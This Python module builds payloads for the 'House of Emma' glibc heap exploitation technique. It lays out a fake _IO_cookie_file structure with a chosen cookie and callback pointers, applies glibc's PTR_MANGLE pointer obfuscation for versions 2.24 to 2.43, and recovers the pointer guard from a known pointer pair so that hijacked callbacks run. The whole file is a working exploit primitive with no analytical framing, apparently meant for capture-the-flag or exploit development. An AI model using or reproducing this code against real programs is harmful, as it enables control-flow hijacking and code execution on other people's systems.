"""House of Emma cookie FILE callback field plan."""
from dataclasses import dataclass

@dataclass(frozen=True)
class MemoryWrite:
    address: int
    data: bytes
    label: str

def _p(v: int) -> bytes:
    if not isinstance(v, int) or not 0 <= v < 1 << 64: raise ValueError("value must fit uint64")
    return v.to_bytes(8, "little")

def rol64(value: int, bits: int) -> int:
    value &= (1 << 64) - 1
    return ((value << bits) | (value >> (64 - bits))) & ((1 << 64) - 1)

def ror64(value: int, bits: int) -> int:
    return rol64(value, 64 - bits)

def encode_cookie_callback(callback_addr: int, pointer_guard: int, *, mangled: bool) -> int:
    """按 glibc cookie callback ABI 生成明文或 PTR_MANGLE 后的函数指针。"""
    if not mangled: return callback_addr
    return rol64(callback_addr ^ pointer_guard, 17)

def recover_pointer_guard(known_callback_addr: int, encoded_callback: int) -> int:
    """由已知明文 callback 和其 cookie 槽密文恢复 pointer_guard。"""
    return ror64(encoded_callback, 17) ^ known_callback_addr

def build_house_of_emma(*, version: str, file_addr: int, cookie_addr: int,
                        callback_addr: int, pointer_guard: int | None = None,
                        read_addr: int = 0, seek_addr: int = 0,
                        close_addr: int = 0) -> tuple[MemoryWrite, ...]:
    """生成 `_IO_cookie_file` 的 cookie 与四个回调槽。

    version: 2.23 使用明文回调；2.24～2.43 要求 pointer_guard 并生成 PTR_MANGLE。
    file_addr: fake FILE 地址；cookie_addr: `FILE+0xe0` 的 cookie 值。
    callback_addr: 要消费的 write 回调；read/seek/close_addr 为其余槽值。
    pointer_guard: 2.24+ 的 fs:0x30 派生值，未知时函数拒绝生成密文。
    """
    if version not in {f"2.{i}" for i in range(23, 44)}: raise ValueError("unsupported glibc version")
    mangled = version != "2.23"
    if mangled and pointer_guard is None: raise ValueError("2.24+ requires pointer_guard")
    guard = 0 if pointer_guard is None else pointer_guard
    vals = [encode_cookie_callback(v, guard, mangled=mangled) for v in (read_addr, callback_addr, seek_addr, close_addr)]
    image = bytearray(0x108)
    image[0xe0:0xe8] = _p(cookie_addr)
    for index, value in enumerate(vals): image[0xe8 + index * 8:0xf0 + index * 8] = _p(value)
    return (MemoryWrite(file_addr, bytes(image), f"cookie FILE ({version})"),)
